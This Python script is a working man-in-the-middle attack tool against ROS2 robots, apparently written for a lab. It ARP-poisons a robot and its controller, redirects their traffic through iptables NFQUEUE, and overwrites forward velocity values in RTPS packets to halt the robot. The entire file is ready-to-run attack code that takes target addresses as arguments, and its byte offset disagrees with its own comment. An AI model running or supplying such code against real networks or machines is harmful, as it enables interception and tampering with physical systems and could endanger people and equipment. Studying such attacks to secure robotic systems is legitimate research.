from scapy.all import *
from netfilterqueue import NetfilterQueue
import threading
import time
import subprocess
import re
# --- NETFILTERQUEUE PACKET PROCESSING ---
import struct # Required for binary packing/unpacking
import argparse
import os

'''
# --- SETTINGS ---
#robot_ip      = "10.3.141.194"
#controller_ip = "10.3.141.131"
robot_ip = "192.168.0.194"
controller_ip = "192.168.0.16"
interface     = "wlan0"
queue_number  = 1
'''

# --- MAC RESOLUTION & ARP SPOOFING ---
def get_mac(ip):
    # 1. Ping more aggressively to populate the ARP cache
    print(f"[*] Pinging {ip} to populate ARP cache...")
    subprocess.run(["ping", "-c", "5", "-W", "2", ip],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # 2. Read the local ARP table
    try:
        with open("/proc/net/arp") as f:
            for line in f:
                fields = line.split()
                if len(fields) < 4:
                    continue
                if fields[0] == ip:
                    mac = fields[3]
                    # Skip genuinely empty entries
                    if mac != "00:00:00:00:00:00":
                        return mac
    except Exception as e:
        print(f"[!] Error reading ARP table: {e}")

    # 3. Fallback to arping if the table read fails
    print(f"[*] Trying arping for {ip}...")
    try:
        result = subprocess.run(
            ["arping", "-I", interface, "-c", "5", "-w", "5", ip],
            capture_output=True, text=True
        )
        match = re.search(r'\[([0-9a-f:]{17})\]', result.stdout, re.IGNORECASE)
        if match:
            return match.group(1).lower()
    except FileNotFoundError:
        print("[!] arping not found! Run: sudo apt install iputils-arping")
    except Exception as e:
        print(f"[!] Arping error: {e}")

    return None

def spoof(target_ip, host_ip, target_mac):
    # Wrap in Ethernet frame to guarantee Layer 2 delivery
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    sendp(packet, iface=interface, verbose=False)

# This runs in the background so it doesn't block packet processing
def arp_poison_thread(robot_mac, controller_mac):
    print("[*] ARP Poisoning Thread Active...")
    while True:
        spoof(robot_ip, controller_ip, robot_mac)
        spoof(controller_ip, robot_ip, controller_mac)
        time.sleep(2) 


def process_packet(packet):
    scapy_pkt = IP(packet.get_payload())
    
    # 1. ROS2 uses UDP, so we only care about UDP packets
    if scapy_pkt.haslayer(UDP) and scapy_pkt.haslayer(Raw):
        raw_data = scapy_pkt[Raw].load
        print(raw_data[:100])
        # 2. Check the RTPS "Magic Header" (0x52 0x54 0x50 0x53)
        if raw_data.startswith(b'RTPS'):
            
            # --- THE MANIPULATION ZONE ---
            # Disclaimer: RTPS headers vary in length. For this to work flawlessly 
            # in your specific lab, you must find the exact byte offset of the Twist msg.
            # Let's pretend Wireshark showed us the linear.x velocity is an 
            # 8-byte double (float64) starting at byte 64 of the UDP payload.
            
            target_offset = 60 
            
            # Ensure the packet is actually long enough to contain the data
            if len(raw_data) >= target_offset + 8: 
                
                # Unpack the current velocity (using little-endian double format '<d')
                current_velocity = struct.unpack('<d', raw_data[target_offset:target_offset+8])[0]
                
                # Check if it's moving forward
                if current_velocity > 0.0:
                    print(f"[!] Intercepted Velocity: {current_velocity} m/s")
                    
                    # MODIFY: Force the robot to stop by packing a 0.0 float into bytes
                    malicious_velocity = 0.0
                    malicious_bytes = struct.pack('<d', malicious_velocity)
                    
                    # Rebuild the raw binary payload with our injected bytes
                    new_payload = raw_data[:target_offset] + malicious_bytes + raw_data[target_offset+8:]
                    scapy_pkt[Raw].load = new_payload
                    
                    # 3. Recalculate Checksums (Crucial for UDP!)
                    del scapy_pkt[IP].len
                    del scapy_pkt[IP].chksum
                    del scapy_pkt[UDP].len
                    del scapy_pkt[UDP].chksum
                    
                    # Pack the updated packet back into the queue
                    packet.set_payload(bytes(scapy_pkt))
                    print(f"[*] Injected Velocity: {malicious_velocity} m/s")

    # ACCEPT the packet so the Linux kernel routes it to the target
    packet.accept()

# --- STARTUP LOGIC ---
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ROS2 RTPS MitM")
    parser.add_argument("--robot", required=True, help="Robot IP")
    parser.add_argument("--controller", required=True, help="Controller IP")
    parser.add_argument("--iface", default="wlan0", help="Network Interface")
    parser.add_argument("--queue", type=int, default=1, help="NFQueue Number")
    args = parser.parse_args()

    # Assign to globals so your existing functions can use them
    robot_ip = args.robot
    controller_ip = args.controller
    interface = args.iface
    queue_number = args.queue

    print("[*] Python Interceptor Initializing...")
    
    robot_mac = get_mac(robot_ip)
    controller_mac = get_mac(controller_ip)
    
    if not robot_mac or not controller_mac:
        print("[!] Failed to get MAC addresses. Check IPs and interface. Exiting.")
        exit(1)
        
    print(f"[*] Target 1 (Robot):      {robot_ip} @ {robot_mac}")
    print(f"[*] Target 2 (Controller): {controller_ip} @ {controller_mac}")
    
    # 1. Setup iptables to route traffic to NFQUEUE
    print(f"[*] Setting up iptables rules for NFQUEUE #{queue_number}...")
    os.system(f"sudo iptables -I FORWARD -j NFQUEUE --queue-num {queue_number}")
    
    # Start ARP Spoofing in the background
    arp_thread = threading.Thread(target=arp_poison_thread, args=(robot_mac, controller_mac), daemon=True)
    arp_thread.start()
    
    # Bind the NetfilterQueue to the main thread
    nfqueue = NetfilterQueue()
    nfqueue.bind(queue_number, process_packet)
    
    print(f"\n[*] Waiting for packets on Queue #{queue_number}... (Press Ctrl+C to stop)")
    try:
        nfqueue.run() 
    except KeyboardInterrupt:
        print("\n[*] Python script shutting down...")
    finally:
        # 2. Cleanup iptables rules automatically on exit
        print("[*] Flushing iptables NFQUEUE rules...")
        nfqueue.unbind()
        os.system(f"sudo iptables -D FORWARD -j NFQUEUE --queue-num {queue_number}")
        print("[*] Cleanup complete.")